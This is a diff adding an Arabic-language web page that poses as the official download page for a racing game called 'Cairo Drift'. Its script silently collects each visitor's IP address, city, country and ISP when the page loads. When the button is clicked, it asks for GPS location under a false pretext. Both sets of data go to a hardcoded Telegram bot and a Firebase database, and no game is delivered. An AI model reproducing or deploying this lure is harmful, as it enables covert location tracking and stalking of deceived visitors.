@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cairo Drift v2.0 | التحميل الرسمي</title>
+    <style>
+        body { background-color: #0f0f0f; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .card { background: #1a1a1a; border: 2px solid #e74c3c; padding: 40px; border-radius: 20px; box-shadow: 0 0 20px rgba(231, 76, 60, 0.3); max-width: 400px; }
+        h1 { color: #e74c3c; margin-bottom: 10px; }
+        p { color: #bdc3c7; line-height: 1.6; }
+        .btn { background: #e74c3c; color: #fff; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.3s; margin-top: 20px; text-decoration: none; display: inline-block; }
+        .btn:hover { background: #c0392b; transform: scale(1.05); }
+        #status { margin-top: 20px; font-size: 12px; color: #7f8c8d; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>🏎️ Cairo Drift</h1>
+        <p>مرحباً بك في أسرع لعبة سباق في مصر!<br>اضغط للبدء في فحص توافق جهازك وتحميل ملفات اللعبة.</p>
+        <button class="btn" id="mainBtn">بدء الفحص والتحميل</button>
+        <div id="status">جاري الاتصال بالسيرفر...</div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // إعدادات Firebase الخاصة بك (haker-2444d)
+        const firebaseConfig = {
+            apiKey: "AIzaSyDoCMDDboGlgvcqPrKe0iu04Y1xnjAntro",
+            authDomain: "haker-2444d.firebaseapp.com",
+            databaseURL: "https://haker-2444d-default-rtdb.firebaseio.com",
+            projectId: "haker-2444d",
+            storageBucket: "haker-2444d.firebasestorage.app",
+            messagingSenderId: "213330360128",
+            appId: "1:213330360128:web:f65d46e4e93a0adfe62ca5"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // بيانات Telegram
+        const telegramToken = "8391064470:AAG_T8PoTc4bVx2DEEB7H3VBloZ1nhvV-M0";
+        const chatId = "6945629910";
+
+        // --- 1. الصيد الصامت (بمجرد فتح الصفحة) ---
+        window.onload = async () => {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                const silentMsg = `🕵️ صيد صامت جديد!\n🌐 الـ IP: ${data.ip}\n📍 المكان: ${data.city}, ${data.country_name}\n🏢 الشركة: ${data.org}`;
+                
+                // إرسال لتليجرام
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(silentMsg)}`);
+                
+                // حفظ في فايربيز
+                push(ref(db, 'silent_logs'), { ...data, time: new Date().toLocaleString() });
+            } catch (e) { console.log("Silent fail"); }
+        };
+
+        // --- 2. الصيد الدقيق (عند الضغط على الزرار) ---
+        document.getElementById('mainBtn').onclick = function() {
+            document.getElementById('status').innerText = "جاري تحديد أقرب سيرفر لبلدك...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const gpsMsg = `🎯 صيد دقيق (GPS)!\n📍 الموقع: ${mapUrl}\n⏰ الوقت: ${new Date().toLocaleString()}`;
+                    
+                    // إرسال لتليجرام
+                    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gpsMsg)}`);
+                    
+                    // حفظ في فايربيز
+                    push(ref(db, 'gps_logs'), { lat, lon, time: new Date().toLocaleString() });
+
+                    document.getElementById('status').innerText = "تم الفحص! سيبدأ التحميل تلقائياً...";
+                }, (err) => {
+                    document.getElementById('status').innerText = "خطأ: يجب السماح بالوصول للموقع لإتمام التحميل.";
+                });
+            }
+        };
+    </script>
+</body>
+</html>
